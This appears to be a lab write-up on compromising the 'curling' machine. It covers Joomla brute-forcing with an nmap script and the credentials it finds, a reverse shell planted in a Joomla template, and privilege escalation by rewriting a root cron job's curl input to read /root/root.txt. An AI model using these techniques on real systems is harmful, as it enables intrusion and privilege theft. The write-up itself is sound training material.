## Reconnaissance

Check open services/ports using nmap 

```
Nmap scan report for 10.10.10.150
Host is up, received syn-ack (0.15s latency).
Scanned at 2019-03-15 02:20:11 IST for 12s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGsat32aGJHTbu0gQU9FYIMlMqF/uiytTZ6lsW+EIodvlPp6Cu5VHfs2iEFd5nfn0s+97qTfJ258lf7Gk3rHrULvCrUif2wThIeW3m4fS5j6O2ZPjv0Gl5g02TItSklwQmjJfyH0KR5b1D9bGCXQV3Gm585DD8wZrOpTxDjGCnmByYoHitfG6sa1LC7Sckb8g9Km40fvfKPPWMHgzUhXC3g3wXyjXXeByZvhjbAAuOv7MKda6MjeNUH71hkiQRkTwZ8qqY9fbDDnSKOHdkC2Scs+8tcpz8AIekc/hmDSn+QKbs+3iV0FLoW9TOPmT8xz45etnqW6DhhlcrO7aFju33
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN2TI0Uv8Dr/6h+pEZ34kyKx7H6tD1gC/FB4q19PO4klA767pC7YVB3NTdEs2TGI+8XAevVqHiQv/8ZniMwG9IU=
|   256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILhmU6S36IrO41biIUZrXnzMGw3OZmLLHS/DxqKLPkVU
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-generator: Joomla! - Open Source Content Management
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see Joomla CMS being run on port 80, enumerating directories we get a few interesting ones. 

```
http://10.10.10.150:80/administrator 
http://10.10.10.150:80/plugins 
http://10.10.10.150:80/README.txt 
http://10.10.10.150:80/templates 
http://10.10.10.150:80/tmp/ 
http://10.10.10.150:80/web.config.txt 
```

The admin portal is exposed. From one of the blog posts, we can see that the username is `floris`

Initially, I sprayed passwords generated from `cewl` utility. But we didn't get a successful hit on any of the passwords. 

Looking at the source code, there is a `secret.txt` which has a base64 string. On decoding, we get the password Curling2018! <br>
On a side note, I came across a nmap script which brute forces the login. 

```
# Nmap 7.70 scan initiated Sat Mar 16 20:54:09 2019 as: nmap -p80 -sV --script http-joomla-brute --script-args userdb=curling-cewl-username,passdb=curling-cewl-passwords,http-joomla-brute.hostname=10.10.10.150,http-joomla-brute.threads=10 -vv -oN nmap-curling-joomla-bruteforce 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up, received syn-ack (0.16s latency).
Scanned at 2019-03-16 20:54:10 IST for 9s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-joomla-brute:
|   Accounts:
|     Floris:Curling2018! - Valid credentials
|     floris:Curling2018! - Valid credentials
|_  Statistics: Performed 21 guesses in 2 seconds, average tps: 10.5
|_http-server-header: Apache/2.4.29 (Ubuntu)

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/
```

## Exploitation

Okay, we now have successfully logged into the admin portal. Joomla serves contents writeen on PHP.
So to get a reverse shell, we would need to create/edit a file in the admin portal and call it to get shell. 

Under `Extensions -> Templates -> Templates -> Protostar`, we can see a couple of files which we can edit of modify. 

I modified the error.php file with contents of my reverse shell and called it with http://10.10.10.150/templates/protostar/error.php

We got a shell with the least privileges. 

<p align="center">
  <img src="https://github.com/gameFace22/vulnmachine-walkthrough/blob/master/images/floris-shell.png">
</p>

## Privilege Escalation 

Under /home/floris/, there is an interesting file called password_backup.

```
$ cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
```

Looks like this is a hex file and from the first few bytes BZh91AY also known as magic header, we can see that it is a bz2 file.

With more google-fu, found out that there is a utility called `xxd` which we can use to convert from hex to original output.

```
xxd -r password_backup > password_bc
```

Renaming the extension to bz2, unzipping it multiple times, we finally get a password.txt file which looks like the SSH password of the user floris. 

Now, we can SSH into the box with obtained credentials. 

Before enumerating the box, I found there is an interesting folder called admin-area which has two files input and report. 
I was stuck in this part for a bit, luckily someone had copied an executable into my home and I was looking into what it does. 

`pspy` monitors all linux processes, cron jobs run by other users. When I ran the tool, I came across multiple curl requets using the input file from admin-area. 

Also, both the files are owned by root and floris has permissions to write to it. 

```
floris@curling:~/admin-area$ ls -la
total 28
drwxr-x--- 2 root   floris  4096 May 22  2018 .
drwxr-xr-x 6 floris floris  4096 Mar 24 13:02 ..
-rw-rw---- 1 root   floris    25 Mar 24 13:03 input
-rw-rw---- 1 root   floris 12908 Mar 24 13:03 report
```

Figured out we need to change the input file to fetch the root flag using file protocol instead of http and after a few seconds, got the flag printed in the report file. 

Discussing this with another user on the forums, found that you can also use directory traversal in the input file to fetch the flag. 
Something like `curl http://127.0.0.1/../../../root/root.txt`

## References

1) https://github.com/DominicBreuker/pspy
2) https://superuser.com/questions/866006/is-it-possible-to-reverse-xxd-to-get-original-file-from-binary-file
3) http://jpsecuritytuts.blogspot.com/2014/05/how-to-shell-joomla-sites.html
